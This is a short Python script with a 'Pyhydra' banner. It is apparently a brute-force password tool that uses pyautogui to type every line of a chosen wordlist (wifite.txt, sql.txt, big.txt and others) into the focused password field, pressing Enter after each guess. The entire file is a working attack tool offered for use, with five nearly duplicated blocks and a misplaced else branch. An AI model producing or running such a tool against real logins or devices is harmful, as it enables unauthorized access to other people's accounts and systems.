import pyautogui
import time
import os
os.system("clear")
banner="""
 ____        _               _
|  _ \ _   _| |__  _   _  __| |_ __ __ _
| |_) | | | | '_ \| | | |/ _` | '__/ _` |
|  __/| |_| | | | | |_| | (_| | | | (_| |
|_|    \__, |_| |_|\__, |\__,_|_|  \__,_|
       |___/       |___/

 """
print(banner)
info="""

====================================
Select Your List File
====================================
wifite.txt    [1]
wordlist.txt  [2]
namelist.txt  [3]
sql.txt       [4]
big.txt       [5]


"""
print(info)
inp=input("Select ==>")
tm=int(input("Start Attack After ==>"))
time.sleep(tm)
if inp=='1':
      oname='wifite.txt'
      print('now focus on password input .......')
      with open(oname,'r') as f: 
           filo=f.readlines()
           files=int(len(filo))
           time.sleep(5)
           for i in range(0,files):
                pyautogui.write(filo[i])
                pyautogui.press('enter')
                time.sleep(1)
if inp=='2':
      oname1='wordlist.txt'
      print('now focus on password input .......')
      with open(oname1,'r') as g: 
           filo1=g.readlines()
           files1=int(len(filo1))
           time.sleep(5)
           for l in range(0,files1):
                pyautogui.write(filo1[l])
                pyautogui.press('enter')
                time.sleep(1)
if inp=='3':
      oname2='namelist.txt'
      print('now focus on password input .......')
      with open(oname2,'r') as o: 
           filo2=o.readlines()
           files2=int(len(filo2))
           time.sleep(5)
           for q in range(0,files2):
                pyautogui.write(filo2[q])
                pyautogui.press('enter')
                time.sleep(1)
if inp=='4':
      oname3='sql.txt'
      print('now focus on password input .......')
      with open(oname3,'r') as p: 
           filo3=p.readlines()
           files3=int(len(filo3))
           time.sleep(5)
           for e in range(0,files3):
                pyautogui.write(filo3[e])
                pyautogui.press('enter')
                time.sleep(1)
if inp=='5':
      oname4='big.txt'
      print('now focus on password input .......')
      with open(oname4,'r') as i: 
           filo4=i.readlines()
           files4=int(len(filo4))
           time.sleep(5)
           for c in range(0,files4):
                pyautogui.write(filo4[c])
                pyautogui.press('enter')
                time.sleep(1)

     
     
     
            
else:
    print('please enter number.....!')
